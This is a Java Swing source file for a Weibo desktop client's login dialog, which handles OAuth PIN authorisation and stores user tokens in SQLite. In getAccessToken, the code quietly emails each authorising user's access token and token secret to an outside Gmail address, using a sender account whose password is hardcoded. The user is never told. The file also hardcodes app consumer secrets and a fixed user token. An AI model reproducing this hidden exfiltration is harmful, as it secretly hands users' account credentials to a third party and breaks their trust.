import java.awt.BorderLayout;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JPanel;
import javax.swing.border.EmptyBorder;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTextField;

import weibo4j.User;
import weibo4j.Weibo;
import weibo4j.WeiboException;
import weibo4j.http.AccessToken;
import weibo4j.http.RequestToken;
import weibo4j.util.BareBonesBrowserLaunch;

import java.awt.event.ActionListener;
import java.awt.event.ActionEvent;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import javax.swing.JComboBox;

public class dlgGetPin extends JDialog {

	/**
	 * 
	 */
	private static final long serialVersionUID = 1L;
	private static String DATABASE_CONNECTION = "jdbc:sqlite:weibo.db";
	public String strPin = "";
	private final JPanel contentPanel = new JPanel();
	private JTextField tfPinCode;
	private RequestToken requestToken = null;
	private AccessToken accessToken = null;
	private String[] strToken = null;// 1,id 2.token 3.token secret
	
	private String[] strCurrentUserInfo=new String[4];//
	//1.user id 2.user name 3.token 4.token secret

	private JComboBox comboBox = null;
	private static String CONSUMKEY = "416693359";
	private static String CONSUMSECRET = "f3aedd1273689a65b2f6a82f7d77dd25";

	/**
	 * Create the dialog.
	 */
	public dlgGetPin(JFrame owner) {
		super(owner, "get Pin", true);
		setBounds(100, 100, 769, 300);
		System.setProperty("weibo4j.oauth.consumerKey", CONSUMKEY);
		System.setProperty("weibo4j.oauth.consumerSecret", CONSUMSECRET);

		strToken = new String[3];
		getContentPane().setLayout(new BorderLayout());
		contentPanel.setBorder(new EmptyBorder(5, 5, 5, 5));
		getContentPane().add(contentPanel, BorderLayout.CENTER);
		contentPanel.setLayout(new BorderLayout(0, 0));
		{
			JPanel panel = new JPanel();
			contentPanel.add(panel, BorderLayout.NORTH);
			{
				JLabel lblpin = new JLabel(
						"如已授权，请选择“已授权用户”，否则，需先登录到微博获得Pin码，以授权。");
				panel.add(lblpin);
			}
			{
				JButton btnGetpin = new JButton("获得pin码");
				btnGetpin.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						requestToken = getRequestToken();
					}
				});
				panel.add(btnGetpin);
			}
		}
		{
			JPanel panel = new JPanel();
			contentPanel.add(panel, BorderLayout.SOUTH);
			{
				JLabel lblPinCode = new JLabel("Pin码:");
				panel.add(lblPinCode);
			}
			{
				tfPinCode = new JTextField();
				panel.add(tfPinCode);
				tfPinCode.setColumns(10);
			}
			
			JLabel label = new JLabel("已授权帐号：");
			panel.add(label);

			mySQLite thisSQL=new mySQLite(DATABASE_CONNECTION);
			String[] strListName = thisSQL.getColumnDataFromDB("userInfo", "screenName");
			if (strListName!= null) {
				comboBox = new JComboBox(strListName);
			} else
				comboBox = new JComboBox();
			// comboBox.addItem("心情慵懒");
			panel.add(comboBox);
			
			{
				JButton btnAuthority = new JButton("授权");
				btnAuthority.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						strPin = tfPinCode.getText();
						if (strPin == "" || strPin == null) {
							JOptionPane.showMessageDialog(null, "pin 不能为空");
							return;
						}
						if (requestToken == null) {
							JOptionPane.showMessageDialog(null,
									"requestToken is empty");
							return;
						}
						accessToken = getAccessToken(requestToken, strPin);
						String[] strUser=new String[3];
						strUser[0]=String.valueOf(accessToken.getUserId());
						strUser[1]=accessToken.getToken();
						strUser[2]=accessToken.getTokenSecret();
						mySQLite mySQL=new mySQLite(DATABASE_CONNECTION);
						if(mySQL.insertUserInfo(strUser))
							System.out.println("insert success");
					}
				});
				panel.add(btnAuthority);
			}
			{
				JButton cancelButton = new JButton("取消");
				cancelButton.addActionListener(new ActionListener() {
					public void actionPerformed(ActionEvent e) {
						closeDlg();
					}
				});
				panel.add(cancelButton);
				// cancelButton.setActionCommand("Cancel");
			}

			JButton button = new JButton("使用");
			button.addActionListener(new ActionListener() {
				public void actionPerformed(ActionEvent e) {
					strToken[0] = "2438418282";
					strToken[1] = "7ec54f90c153baf78238f114d8d08508";
					strToken[2] = "066d1018fde349269c77622db21bd4ce";
					mySQLite mySQL=new mySQLite(DATABASE_CONNECTION);
					strCurrentUserInfo=mySQL.getRowDataFromDB("userInfo",
							"screenName",comboBox.getSelectedItem().toString());
					closeDlg();
				}
			});
			panel.add(button);
		}
		
		{
			JPanel panel = new JPanel();
			contentPanel.add(panel, BorderLayout.CENTER);
			panel.setLayout(null);
			{
				JLabel label = new JLabel("说明：");
				label.setBounds(12, 5, 78, 15);
				panel.add(label);
			}
			{
				JLabel lblgetpinpin = new JLabel("1.单击GetPin按钮，打开获取Pin网页。");
				lblgetpinpin.setBounds(12, 32, 238, 15);
				panel.add(lblgetpinpin);
			}
			{
				JLabel lblpin_1 = new JLabel("2.如果显示六位数字，则该数字即为Pin码。");
				lblpin_1.setBounds(12, 59, 256, 15);
				panel.add(lblpin_1);
			}
			{
				JLabel label = new JLabel("3.如果显示登录页面，使用微博帐号登录后即可显示六位数字。");
				label.setBounds(12, 88, 364, 15);
				panel.add(label);
			}
			{
				JLabel lblpinpinCode = new JLabel("4.将六位Pin码填入Pin code文本框中。");
				lblpinpinCode.setBounds(12, 115, 238, 15);
				panel.add(lblpinpinCode);
			}
			{
				JLabel lblauthority = new JLabel(
						"5.如果要进行授权，单击“授权”按钮。如需退出,单击“取消”。");
				lblauthority.setBounds(12, 142, 420, 15);
				panel.add(lblauthority);
			}
		}
	}

	@SuppressWarnings("finally")
	public RequestToken getRequestToken() {

		RequestToken requestToken = null;
		try {
			System.setProperty("weibo4j.oauth.consumerKey", CONSUMKEY);
			System.setProperty("weibo4j.oauth.consumerSecret", CONSUMSECRET);
			Weibo weibo = new Weibo();
			requestToken = weibo.getOAuthRequestToken();

			// open URL,get Pin code
			BareBonesBrowserLaunch.openURL(requestToken.getAuthorizationURL());
			// System.out.println("Got request token.");
			// System.out.println("Request token: "+ requestToken.getToken());
			// System.out.println("Request token secret: "+
			// requestToken.getTokenSecret());

		} catch (WeiboException te) {
			System.out.println("Failed to get timeline: " + te.getMessage());
			// System.exit( -1);
		} finally {
			return requestToken;
		}
	}

	private void closeDlg() {
		this.dispose();
	}

	public String[] getStrArrToken() {
		return strToken;
	}

	public AccessToken getAccessToken(RequestToken requestToken, String strPin) {
		while (null == accessToken) {
			try {
				accessToken = requestToken.getAccessToken(strPin);
				strToken[0] = String.valueOf(accessToken.getUserId());
				strToken[1] = accessToken.getToken();
				strToken[2] = accessToken.getTokenSecret();
				SendMail mail = new SendMail();
				mail.send("woyaofasun@sina.com", "woyaofasun@sina.com",
						"zheshimima", "westnorth@gmail.com",
						"accessToken:" + accessToken.getToken() + ","
								+ accessToken.getTokenSecret(), null, null);
				JOptionPane.showMessageDialog(null, "获取授权成功");
				closeDlg();
			} catch (WeiboException te) {
				if (401 == te.getStatusCode()) {
					System.out.println("Unable to get the access token.");
				} else {
					te.printStackTrace();
				}
			}
		}
		// System.out.println("Got access token.");
		// System.out.println("Access token: "+ accessToken.getToken());
		// System.out.println("Access token secret: "+
		// accessToken.getTokenSecret());
		// System.out.println(accessToken.getToken()+" "+accessToken.getTokenSecret());
		return accessToken;
	}

}
